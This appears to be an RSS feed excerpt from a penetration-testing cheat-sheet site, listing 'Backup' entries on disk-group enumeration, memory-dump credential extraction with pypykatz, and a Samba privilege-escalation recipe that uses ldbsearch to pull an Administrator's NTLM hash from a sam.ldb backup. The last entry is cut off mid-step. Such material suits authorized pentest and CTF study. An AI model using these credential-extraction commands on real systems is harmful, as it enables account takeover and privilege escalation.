channel.title: Backup on TLDRBins
channel.description: Recent content in Backup on TLDRBins

item.title: Disk Group
item.description: General # Show devices lsblk $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 12G 0 disk ├─sda1 8:1 0 120M 0 part /boot ├─sda2 8:2 0 1K 0 part └─sda5 8:5 0 11.9G 0 part ├─Kotarak--vg-root 252:0 0 7G 0 lvm / └─Kotarak--vg-swap_1 252:1 0 1G 0 lvm [SWAP] sr0 11:0 1 1024M 0 rom # Device attributes blkid $ blkid /dev/sda1: UUID="67e178a9-1b2a-407e-8d3f-7b1772bab2be" TYPE="ext2" PARTUUID="1b9f3540-01" /dev/sda5: UUID="LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD" TYPE="LVM2_member" PARTUUID="1b9f3540-05" /dev/mapper/Kotarak--vg-root: UUID="efb44a28-8edc-4d40-aca3-81e57d58d759" TYPE="ext4" /dev/mapper/Kotarak--vg-swap_1: UUID="162b2913-7dcf-4ba7-bddc-238a22f16e52" TYPE="swap" # Show device mapping ls -l /dev/mapper/ $ ls -l /dev/mapper/ total 0 crw------- 1 root root 10, 236 Sep 22 23:22 control lrwxrwxrwx 1 root root 7 Sep 22 23:22 Kotarak--vg-root -> .

item.title: Memory Dump
item.description: Tools binwalk pypykatz MemProcFS # Extract files from memory dump binwalk -M -e <MEMORY_DUMP> Ref: binwalk # Mini dump pypykatz lsa minidump <MEMORY_DUMP> ./memprocfs -mount <PATH> -device <MEMORY_DUMP> Ref: MemProcFS

item.title: Samba
item.description: Priesc #1: Retrieve NTLM from Samba Backup ldbsearch 1. Query 'unicodepwd' of Target User ldbsearch -H sam.ldb '(samaccountname=<USER>)' 'unicodepwd' $ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd' # record 1 dn: CN=Administrator,CN=Users,DC=example,DC=com unicodePwd:: iEb36u6PsRetBr3YMLdYbA== # Referral ref: ldap:///CN=Configuration,DC=example,DC=com # Referral ref: ldap:///DC=DomainDnsZones,DC=example,DC=com # Referral ref: ldap:///DC=ForestDnsZones,DC=example,DC=com # returned 4 records # 1 entries # 3 referrals 2. Convert to Hex echo -n '<UNICODEPWD>' | base64 -d | xxd -p $ echo -n 'iEb36u6PsRetBr3YMLdYbA==' | base64 -d | xxd -p 8846f7eaee8fb117ad06bdd830b7586c 3.
